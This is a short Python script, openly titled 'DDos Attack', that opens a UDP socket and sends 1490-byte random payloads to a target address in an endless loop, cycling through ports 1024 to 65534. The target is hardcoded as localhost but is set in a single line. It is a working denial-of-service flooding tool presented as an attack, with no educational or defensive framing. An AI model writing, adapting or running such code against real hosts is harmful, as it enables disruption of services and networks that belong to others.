#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Jan 31 12:03:28 2022

"""

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
#os.system("figlet DDos Attack")
print ("\n----------------------------------------------------")
print ("\n---------      D D O S     A T T A C K     ---------")
print ("\n----------------------------------------------------\n")
print

ip = '127.0.0.1'
port = 1024

print ("\nThe IP address of the Host to Attack is : ",ip)
print ("\nThe PORT address of the Host to Attack is : ",port)
print ("\n----------------------------------------------------\n")
#os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(2)
print ("[=====               ] 25%")
time.sleep(2)
print ("[==========          ] 50%")
time.sleep(2)
print ("[===============     ] 75%")
time.sleep(2)
print ("[====================] 100%")
time.sleep(2)
print ("\n----------------------------------------------------\n")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
#     time.sleep(1)
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
         port = 1
#         time.sleep(1)